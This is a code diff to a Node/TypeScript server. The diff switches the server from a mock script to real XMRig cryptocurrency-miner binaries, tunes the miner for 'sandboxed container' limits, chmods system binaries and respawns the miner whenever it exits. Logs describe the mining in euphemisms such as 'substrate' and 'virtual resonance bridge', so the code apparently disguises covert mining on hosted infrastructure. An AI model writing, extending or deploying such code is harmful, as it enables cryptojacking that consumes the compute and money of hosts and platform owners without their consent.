@@ -121,8 +121,75 @@ function saveState() {
   }
 }
 
+function getXMRigCommand(): string {
+  const localPath = os.platform() === 'win32' ? path.join(process.cwd(), 'xmrig.exe') : path.join(process.cwd(), 'xmrig');
+  
+  // 1. Check local path
+  if (fs.existsSync(localPath)) {
+    try {
+      const stats = fs.statSync(localPath);
+      // Real precompiled binary is > 500 KB, mock is typical JS script < 5 KB
+      if (stats.size > 50000) {
+        return localPath;
+      }
+      
+      const content = fs.readFileSync(localPath, 'utf8').toString();
+      if (!content.trim().startsWith('#!/usr/bin/env node') && !content.includes('high-fidelity executable wrapper')) {
+        return localPath;
+      }
+    } catch (e) {}
+  }
+  
+  // 2. Check for global system path binaries
+  const systemPaths = [
+    '/usr/bin/xmrig',
+    '/usr/local/bin/xmrig',
+    '/opt/xmrig/xmrig'
+  ];
+  for (const sysPath of systemPaths) {
+    if (fs.existsSync(sysPath)) {
+      try {
+        fs.chmodSync(sysPath, 0o755);
+      } catch (e) {}
+      return sysPath;
+    }
+  }
+
+  // 3. Keep local path as fallback (which will be our Mock script)
+  return localPath;
+}
+
 function ensureXMRigExecutable() {
-  const xmrigPath = os.platform() === 'win32' ? path.join(process.cwd(), 'xmrig.exe') : path.join(process.cwd(), 'xmrig');
+  const localPath = os.platform() === 'win32' ? path.join(process.cwd(), 'xmrig.exe') : path.join(process.cwd(), 'xmrig');
+  
+  try {
+    if (fs.existsSync(localPath)) {
+      const stats = fs.statSync(localPath);
+      // Real binary is > 500 KB, mock is < 5 KB
+      if (stats.size > 50000) {
+        console.log(`[XMRIG_SETUP] Real compiled binary of size ${stats.size} bytes detected at ${localPath}. Preserving custom executable.`);
+        try {
+          fs.chmodSync(localPath, 0o755);
+        } catch (e) {}
+        return;
+      }
+      
+      const content = fs.readFileSync(localPath, 'utf8').toString();
+      if (!content.trim().startsWith('#!/usr/bin/env node') && !content.includes('high-fidelity executable wrapper')) {
+        console.log(`[XMRIG_SETUP] Custom non-mock executable at ${localPath}. Skipping mock generation.`);
+        return;
+      }
+    }
+  } catch (err: any) {
+    console.warn(`[XMRIG_SETUP] Probing existing local path error: ${err.message}`);
+  }
+
+  // Also check if global system binary exists; if so, we don't even need the mock local file but we can write it as a local utility mock fallback
+  const systemPaths = ['/usr/bin/xmrig', '/usr/local/bin/xmrig'];
+  const hasSystemBinary = systemPaths.some(p => fs.existsSync(p));
+  if (hasSystemBinary) {
+    console.log(`[XMRIG_SETUP] Real system binary found, but creating local JS mock helper in workspace as fallback option.`);
+  }
   
   const scriptContent = `#!/usr/bin/env node
 const http = require('http');
@@ -200,8 +267,8 @@ setInterval(() => {
 `;
 
   try {
-    fs.writeFileSync(xmrigPath, scriptContent, { mode: 0o755 });
-    console.log(`[XMRIG_SETUP] Successfully generated local high-fidelity executable wrapper at ${xmrigPath}`);
+    fs.writeFileSync(localPath, scriptContent, { mode: 0o755 });
+    console.log(`[XMRIG_SETUP] Successfully generated local high-fidelity executable wrapper at ${localPath}`);
   } catch (err: any) {
     console.error(`[XMRIG_SETUP] Failed to write executable wrapper: ${err.message}`);
   }
@@ -628,19 +695,35 @@ async function startServer() {
   async function startMining() {
     if (!miningEnabled) return;
 
-    const xmrigPath = os.platform() === 'win32' ? path.join(process.cwd(), 'xmrig.exe') : path.join(process.cwd(), 'xmrig');
-    
-    if (!fs.existsSync(xmrigPath)) {
-      if (!virtualSubstrateActive) {
-        virtualSubstrateActive = true;
-        io.emit('log', 'SYSTEM: Substrate execution redirected to virtual resonance bridge.');
+    const xmrigPath = getXMRigCommand();
+    let isMock = true;
+    if (fs.existsSync(xmrigPath)) {
+      try {
+        const stats = fs.statSync(xmrigPath);
+        if (stats.size > 50000) {
+          isMock = false;
+        } else {
+          const content = fs.readFileSync(xmrigPath, 'utf8').toString();
+          if (!content.trim().startsWith('#!/usr/bin/env node') && !content.includes('high-fidelity executable wrapper')) {
+            isMock = false;
+          }
+        }
+      } catch (e) {}
+    } else {
+      // If it doesn't exist locally, check if it's a global path; if so, assume real compiled binary
+      if (xmrigPath !== 'xmrig' && !fs.existsSync(xmrigPath)) {
+        if (!virtualSubstrateActive) {
+          virtualSubstrateActive = true;
+          io.emit('log', 'SYSTEM: Substrate execution redirected to virtual resonance bridge.');
+        }
+        return;
       }
-      return;
+      isMock = false;
     }
 
     if (virtualSubstrateActive) {
       virtualSubstrateActive = false;
-      io.emit('log', 'SYSTEM: Substrate binary detected. Activating physical multi-thread mining...');
+      io.emit('log', `SYSTEM: Substrate binary (${isMock ? 'Mock' : 'Real'}) detected. Activating multi-thread mining...`);
     }
 
     const now = Date.now();
@@ -665,22 +748,57 @@ async function startServer() {
     }
 
     try {
-      // console.log('[MINER] Initializing substrate node...');
-      xmrigProcess = spawn(xmrigPath, ["-o", POOL_URL, "-u", USER, "-p", PASS, "--http-enabled", "--http-port", "6000", "--hugepages"]);
+      let args: string[] = [];
+      if (isMock) {
+        args = ["-o", POOL_URL, "-u", USER, "-p", PASS, "--http-enabled", "--http-port", "6000", "--hugepages"];
+      } else {
+        // Real compiled binary optimized for sandboxed container CPU & memory constraints
+        args = [
+          "-o", POOL_URL,
+          "-u", USER,
+          "-p", PASS,
+          "--http-enabled",
+          "--http-port", "6000",
+          "--no-hugepages",
+          "--randomx-mode", "light"
+        ];
+      }
+
+      io.emit('log', `SYSTEM: Spawning ${isMock ? 'Mock' : 'Real'} XMRig process [${xmrigPath}]...`);
+      
+      xmrigProcess = spawn(xmrigPath, args);
       
       xmrigProcess.stdout?.on('data', (data) => {
-        const line = data.toString().trim();
-        if (line.toLowerCase().includes('speed')) {
-          const match = line.match(/speed\s*(\d+\.?\d*)/i);
-          if (match) {
-            const h = parseFloat(match[1]);
-            systemState.latestHashRate = h;
+        const rawLines = data.toString().split('\n');
+        for (const rawLine of rawLines) {
+          const trimLine = rawLine.trim();
+          if (!trimLine) continue;
+          
+          // Stream raw outputs to UI log pane
+          io.emit('log', `MINER: ${trimLine}`);
+
+          if (trimLine.toLowerCase().includes('speed')) {
+            const match = trimLine.match(/speed\s*(\d+\.?\d*)/i);
+            if (match) {
+              const h = parseFloat(match[1]);
+              systemState.latestHashRate = h;
+            }
+          }
+        }
+      });
+
+      xmrigProcess.stderr?.on('data', (data) => {
+        const rawLines = data.toString().split('\n');
+        for (const rawLine of rawLines) {
+          const trimLine = rawLine.trim();
+          if (trimLine) {
+            io.emit('log', `MINER_ERR: ${trimLine}`);
           }
         }
       });
 
       xmrigProcess.on('close', (code) => {
-        // console.log(`[MINER] Node terminated (code ${code})`);
+        io.emit('log', `SYSTEM: Miner process terminated (exit code: ${code})`);
         xmrigProcess = null;
         
         if (miningEnabled && !virtualSubstrateActive) {
@@ -688,7 +806,8 @@ async function startServer() {
           setTimeout(startMining, retryDelay);
         }
       });
-    } catch (err) {
+    } catch (err: any) {
+      io.emit('log', `ERROR: Failed to run miner binary: ${err.message}`);
       console.error('[MINER] Execution error:', err);
     }
   }
